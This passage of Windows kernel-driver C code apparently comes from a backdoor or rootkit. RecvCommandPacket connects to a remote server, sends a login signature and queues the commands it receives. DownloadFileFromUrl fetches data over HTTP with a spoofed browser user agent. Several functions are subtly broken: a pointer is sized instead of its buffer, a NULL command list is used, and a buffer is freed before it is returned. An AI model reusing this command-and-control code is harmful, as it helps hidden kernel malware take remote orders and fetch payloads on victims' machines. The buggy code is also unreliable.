		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_ALERT | FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("CheckFileSize ZwCreateFile Failed\n");
		return status;
	}
	pFileInformation = ExAllocatePool(NonPagedPool,sizeof(FILE_STANDARD_INFORMATION));
	if (!pFileInformation)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	status = ZwQueryInformationFile(hFile,
		&iostatus,
		pFileInformation,
		sizeof(FILE_STANDARD_INFORMATION),
		FileStandardInformation);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("CheckFileSize ZwQueryInformationFile failed\n");
		ExFreePool(pFileInformation);
		ZwClose(hFile);
		return status;
	}
	lgFileEnd = ((FILE_STANDARD_INFORMATION*)pFileInformation)->EndOfFile;
	if (ulSize > lgFileEnd.LowPart)
	{
		ExFreePool(pFileInformation);
		ZwClose(hFile);
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	else if (ulSize < lgFileEnd.LowPart)
	{
		ExFreePool(pFileInformation);
		ZwClose(hFile);
		return status;
	}
	else
	{
		ExFreePool(pFileInformation);
		ZwClose(hFile);
		return status;
	}
	ExFreePool(pFileInformation);
	ZwClose(hFile);
	return status;
}
NTSTATUS GetFileLength(char *szFileName,ULONG ulSize)
{
	NTSTATUS Status;
	HANDLE hFile;
	OBJECT_ATTRIBUTES ObjectAttributes;
	UNICODE_STRING UniFileName;
	ANSI_STRING AnsiFileName;
	IO_STATUS_BLOCK IoStatus;
	PFILE_STANDARD_INFORMATION pFileStandardInfo;

	Status = STATUS_SUCCESS;
	pFileStandardInfo = NULL;
	hFile = NULL;

	do 
	{
		RtlInitAnsiString(&AnsiFileName,szFileName);
		RtlAnsiStringToUnicodeString(&UniFileName,&AnsiFileName,TRUE);
		InitializeObjectAttributes(&ObjectAttributes,&UniFileName,OBJ_CASE_INSENSITIVE,NULL,0);
		Status = ZwCreateFile(&hFile,
			FILE_ALL_ACCESS,
			&ObjectAttributes,
			&IoStatus,
			NULL,
			FILE_ATTRIBUTE_NORMAL,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			FILE_OPEN,
			FILE_SYNCHRONOUS_IO_NONALERT,
			NULL,
			0);
		if (NT_ERROR(Status))
		{
			break;
		}
		pFileStandardInfo = (PFILE_STANDARD_INFORMATION)KernelMalloc(sizeof(FILE_STANDARD_INFORMATION));
		if (NULL == pFileStandardInfo)
		{
			Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		Status = ZwQueryInformationFile(hFile,
			&IoStatus,
			pFileStandardInfo,
			sizeof(FILE_STANDARD_INFORMATION),
			FileStandardInformation);
		if (NT_ERROR(Status))
		{
			break;
		}
		ulSize = pFileStandardInfo->EndOfFile.LowPart;
	} while (0);
	if (pFileStandardInfo)
	{
		KernelFree(pFileStandardInfo);
	}
	if (hFile)
	{
		ZwClose(hFile);
	}
	return Status;
}
NTSTATUS GetFileData(PUNICODE_STRING pUnFileName,ULONG ulSize,PCHAR *pFileData)
{
	NTSTATUS Status;
	OBJECT_ATTRIBUTES ObjectAttributes;
	IO_STATUS_BLOCK IoStatus;
	HANDLE hFile;

	Status = STATUS_SUCCESS;
	do 
	{
		InitializeObjectAttributes(&ObjectAttributes,pUnFileName,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,0);
		Status = ZwCreateFile(&hFile,
			FILE_ALL_ACCESS,
			&ObjectAttributes,
			&IoStatus,
			NULL,
			FILE_ATTRIBUTE_NORMAL,
			FILE_SHARE_READ,
			FILE_OPEN,
			FILE_SYNCHRONOUS_IO_NONALERT,
			NULL,
			0);
		if (NT_ERROR(Status))
		{
			break;
		}
		*pFileData = (PCHAR)KernelMalloc(ulSize);
		if (NULL == *pFileData)
		{
			Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		RtlZeroMemory(*pFileData,ulSize);
		Status = ZwReadFile(hFile,
			NULL,
			NULL,
			NULL,
			&IoStatus,
			*pFileData,
			ulSize,
			NULL,
			NULL);
		if (NT_ERROR(Status))
		{
			break;
		}
	} while (0);
	if (hFile)
	{
		ZwClose(hFile);
	}
	if (*pFileData)
	{
		KernelFree(*pFileData);
	}
	return Status;
}
NTSTATUS RecvCommandPacket(ULONG ulRemoteAddress,USHORT uRemotePort)
{
	NTSTATUS Status;
	BOOLEAN bRecvComplete;
	PFILE_OBJECT pConnectionFileObject,pAddressFileObject;
	HANDLE hAddressHandle,hConnectionHandle;
	PLOGIN_PACKET pLoginPacket;
	PCHAR pRecvDat;
	PCOMMAND_LIST pCommandList;
	BOOLEAN bRet;
	KIRQL OldIrql;
	CHECK_PACKET CheckPacket;

	hAddressHandle = NULL;
	hConnectionHandle = NULL;
	pLoginPacket = NULL;
	pConnectionFileObject = NULL;
	pAddressFileObject = NULL;
	pRecvDat = NULL;
	pCommandList = NULL;
	bRet = FALSE;
	bRecvComplete = FALSE;
	Status = STATUS_SUCCESS;

	do 
	{
		Status = CreateAddress(&hAddressHandle,&pAddressFileObject);
		if (NT_ERROR(Status)) 
		{   
			break;
		}
		Status = CreateConnection(&hConnectionHandle,&pConnectionFileObject);
		if (NT_ERROR(Status))
		{
			break;
		}
		Status = Bind(pConnectionFileObject,hAddressHandle);
		if (NT_ERROR(Status))
		{
			break;
		}
		Status = Connect(pConnectionFileObject,ulRemoteAddress,uRemotePort);
		if (NT_ERROR(Status))
		{
			break;
		}
		do 
		{
			pLoginPacket = KernelMalloc(sizeof(LOGIN_PACKET));
		} while (NULL == pLoginPacket);
		RtlZeroMemory(pLoginPacket,sizeof(LOGIN_PACKET));
		RtlCopyMemory(pLoginPacket->LoginSignatureA,LOGIN_SIGNATURE,__STRLEN__(LOGIN_SIGNATURE));
		Status = Send(pConnectionFileObject,pLoginPacket,sizeof(pLoginPacket));
		if (NT_ERROR(Status))
		{
			break;
		}
		do 
		{
			pRecvDat = KernelMalloc(MAXIMUM_RECV_BUFFER);
		} while (0);
		while (bRecvComplete == FALSE)
		{
			RtlZeroMemory(pRecvDat,MAXIMUM_RECV_BUFFER);
			Status = RecvData(pConnectionFileObject,pRecvDat,MAXIMUM_RECV_BUFFER,0);
			if (NT_ERROR(Status))
			{
				break;
			}
			if (__STRNCMPI__(pRecvDat,"Complete",__STRLEN__("Complete")) == 0)
			{
				bRecvComplete = TRUE;
				continue;
			}
			bRet = ProcessCommandLine(pRecvDat,&pCommandList->pCommandLinePack);
			if (FALSE == bRet)
			{
				break;
			}
			InitializeListHead(&pCommandList->NextCmdLine);
			KeAcquireSpinLock(&g_CommandListSpinLock,&OldIrql);
			InsertTailList(&g_CommandListPack,&pCommandList->NextCmdLine);
			KeReleaseSpinLock(&g_CommandListSpinLock,OldIrql);

			CheckPacket.ulRecvCrc32 = MyCrc32(0,pRecvDat,strlen(pRecvDat));
			Status = Send(pConnectionFileObject,&CheckPacket,sizeof(CheckPacket));
			if (NT_ERROR(Status))
			{
				break;
			}
		}
		Status = DisConnect(pConnectionFileObject); 
		if (NT_ERROR(Status))
		{
			break;
		}
	} while (0);
	if (pLoginPacket)
	{
		KernelFree(pLoginPacket);
	}
	if (pConnectionFileObject)
	{
		ObDereferenceObject(pConnectionFileObject);
	}
	if (pAddressFileObject)
	{
		ObDereferenceObject(pAddressFileObject);
	}
	if (hConnectionHandle)
	{
		ZwClose(hConnectionHandle);
	}
	if (hAddressHandle)
	{
		ZwClose(hAddressHandle);
	}
	return Status; 
}
BOOLEAN GetCommandFromUrl(PUCHAR pUrlAddr,USHORT uPort)
{
	NTSTATUS Status;
	ULONG ulAddress;

	Status = STATUS_SUCCESS;
	ulAddress = 0;

	if (QueryDnsAddress(pUrlAddr,&ulAddress))
	{
		Status = RecvCommandPacket(ulAddress,uPort);
		if (NT_ERROR(Status))
		{
			return FALSE;
		}
	}
	return TRUE;
}
PCHAR FormatRequestHeader(PCHAR pServerUrl, \
						  PCHAR pSubUri, \
						  PULONG pulLength, \
						  PCHAR pCookie, \
						  PCHAR pReferer, \
						  ULONG ulFrom, \
						  ULONG ulTo, \
						  ULONG ulServerType)
{
	char szTemp[20];
	PCHAR pRequeseHeader;
	pRequeseHeader = NULL;

	do 
	{
		pRequeseHeader = KernelMalloc(PAGE_SIZE);
	} while (NULL == pRequeseHeader);
	RtlZeroMemory(pRequeseHeader,PAGE_SIZE);

	strcat_s(pRequeseHeader,PAGE_SIZE,"GET ");
	strcat_s(pRequeseHeader,PAGE_SIZE,pSubUri);
	strcat_s(pRequeseHeader,PAGE_SIZE," HTTP/1.1");
    strcat_s(pRequeseHeader,PAGE_SIZE,"\r\n");

    strcat_s(pRequeseHeader,PAGE_SIZE,"Host:");
	strcat_s(pRequeseHeader,PAGE_SIZE,pServerUrl);
    strcat_s(pRequeseHeader,PAGE_SIZE,"\r\n");

	if(pReferer != NULL)
	{
		strcat_s(pRequeseHeader,PAGE_SIZE,"Referer:");
		strcat_s(pRequeseHeader,PAGE_SIZE,pReferer);
		strcat_s(pRequeseHeader,PAGE_SIZE,"\r\n");		
	}

    strcat_s(pRequeseHeader,PAGE_SIZE,"Accept:*/*");
    strcat_s(pRequeseHeader,PAGE_SIZE,"\r\n");

    strcat_s(pRequeseHeader,PAGE_SIZE,"User-Agent:Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)");
    strcat_s(pRequeseHeader,PAGE_SIZE,"\r\n");

	strcat_s(pRequeseHeader,PAGE_SIZE,"Connection:Keep-Alive");
	strcat_s(pRequeseHeader,PAGE_SIZE,"\r\n");

	if(pCookie != NULL)
	{
		strcat_s(pRequeseHeader,PAGE_SIZE,"Set Cookie:0");
		strcat_s(pRequeseHeader,PAGE_SIZE,pCookie);
		strcat_s(pRequeseHeader,PAGE_SIZE,"\r\n");
	}

	if(ulFrom > 0)
	{
		strcat_s(pRequeseHeader,PAGE_SIZE,"Range: bytes=");
		ltoa(ulFrom,szTemp,10);
		strcat_s(pRequeseHeader,PAGE_SIZE,szTemp);
		strcat_s(pRequeseHeader,PAGE_SIZE,"-");
		if(ulTo > ulFrom)
		{
			ltoa(ulTo,szTemp,10);
			strcat_s(pRequeseHeader,PAGE_SIZE,szTemp);
		}
		strcat_s(pRequeseHeader,PAGE_SIZE,"\r\n");
	}
	
	strcat_s(pRequeseHeader,PAGE_SIZE,"\r\n");

	*pulLength = __STRLEN__(pRequeseHeader);
	return pRequeseHeader;
}
PCHAR GetResponseHeader(PFILE_OBJECT pConnectionObject,PCHAR pResponseHeader,PULONG pulLength)
{
	BOOLEAN bEndResponse;
	CHAR RecvDat[PAGE_SIZE];
	int nIndex = 0;
	ULONG ulResponseHeaderSize = 0;

	bEndResponse = FALSE;
	while(!bEndResponse && nIndex < PAGE_SIZE)
	{
		//Status = RecvData(pConnectionObject,RecvDat,PAGE_SIZE,0);
		//if (NT_SUCCESS(Status) || Status)
		//{
		//}
		RecvData(pConnectionObject,RecvDat,PAGE_SIZE,0);
		//pResponseHeader[nIndex++] = RecvDat;
		pResponseHeader = RecvDat;
		if(nIndex >= 4)
		{
			if(pResponseHeader[nIndex - 4] == '\r' && \
				pResponseHeader[nIndex - 3] == '\n' && \
				pResponseHeader[nIndex - 2] == '\r' && \
				pResponseHeader[nIndex - 1] == '\n')
			{
				bEndResponse = TRUE;
			}
		}
	}
	ulResponseHeaderSize = nIndex;
	*pulLength = ulResponseHeaderSize;
	return pResponseHeader;
}
BOOLEAN DownloadFileFromUrl(PCHAR pUrl,USHORT uPort,PCHAR pUri)
{
	BOOLEAN bRet;
	NTSTATUS Status;
	PHOSTENT pRemoteHost;
	in_addr ip_addr;
	sockaddr_in ServerSocket;
	PCHAR pRequest;
	PFILE_OBJECT pConnectionFileObject,pAddressFileObject;
	HANDLE hAddressHandle,hConnectionHandle;
	ULONG ulRemoteAddress;
	ULONG ulRetLength;
	CHAR RecvDat[PAGE_SIZE];

	hAddressHandle = NULL;
	hConnectionHandle = NULL;
	pConnectionFileObject = NULL;
	pAddressFileObject = NULL;
	bRet = FALSE;
	pRequest = NULL;
	ulRemoteAddress = 0;
	ulRetLength = 0;
	Status = STATUS_SUCCESS;


	pRemoteHost = gethostbyname(pUrl);
	RtlCopyMemory(&ip_addr,pRemoteHost->h_addr_list[0],4);
	RtlZeroMemory(&ServerSocket,sizeof(sockaddr_in));
	ServerSocket.sin_family = AF_INET;
	ServerSocket.sin_port = HTONS(uPort);
	ServerSocket.sin_addr = ip_addr;

	do 
	{
		pRequest = FormatRequestHeader(pUrl, \
			pUri, \
			0, \
			NULL, \
			NULL, \
			0, \
			0, \
			0);
		if (NULL == pRequest)
		{
			break;
		}
		Status = CreateAddress(&hAddressHandle,&pAddressFileObject);
		if (NT_ERROR(Status)) 
		{   
			break;
		}
		Status = CreateConnection(&hConnectionHandle,&pConnectionFileObject);
		if (NT_ERROR(Status))
		{
			break;
		}
		Status = Bind(pConnectionFileObject,hAddressHandle);
		if (NT_ERROR(Status))
		{
			break;
		}
		if (QueryDnsAddress((PUCHAR)pUrl,&ulRemoteAddress) == FALSE)
		{
			break;
		}
		Status = Connect(pConnectionFileObject,ulRemoteAddress,HTONS(uPort));
		if (NT_ERROR(Status))
		{
			break;
		}
		Status = Send(pConnectionFileObject,pRequest,__STRLEN__(pRequest));
		if (NT_ERROR(Status))
		{
			break;
		}
		GetResponseHeader(pConnectionFileObject,pRequest,&ulRetLength);
		do 
		{
			ulRetLength = RecvData(pConnectionFileObject,RecvDat,PAGE_SIZE,0);
		} while (ulRetLength >= PAGE_SIZE);
		bRet = TRUE;
		Status = DisConnect(pConnectionFileObject); 
		if (NT_ERROR(Status))
		{
			break;
		}
	} while (0);
	if (pRequest)
	{
		KernelFree(pRequest);
	}
	if (pConnectionFileObject)
	{
		ObDereferenceObject(pConnectionFileObject);
	}
	if (pAddressFileObject)
	{
		ObDereferenceObject(pAddressFileObject);
	}
	if (hConnectionHandle)
	{
		ZwClose(hConnectionHandle);
	}
	if (hAddressHandle)
	{
		ZwClose(hAddressHandle);
	}
	return bRet;
}